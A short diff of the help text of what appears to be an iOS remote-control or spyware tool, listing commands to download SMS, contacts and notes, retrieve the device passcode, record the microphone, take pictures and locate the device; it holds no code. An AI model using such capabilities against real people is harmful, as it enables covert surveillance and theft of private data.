@@ -7,12 +7,10 @@ getcontacts    : Download addressbook.
 getnotes       : Download notes.
 getpasscode    : Retreive the device passcode.
 getsms         : Download SMS data.
-getvol         : Get volume level.
 home           : Simulate a home button press.
 islocked       : Check if the device is locked.
 lastapp        : Get last opened application.
 locate         : Get device location coordinates.
-location       : Toggle location services.
 mic            : Record mic sound.
 mute           : Update and view mute status.
 open           : Open application.
@@ -21,6 +19,4 @@ picture        : Take picture through iSight.
 pid            : Get MPL process ID.
 respring       : Restart SpringBoard.
 safemode       : Put device into SafeMode.
-setvol         : Set output volume.
-sysinfo        : View system information.
 upload         : Upload local file.
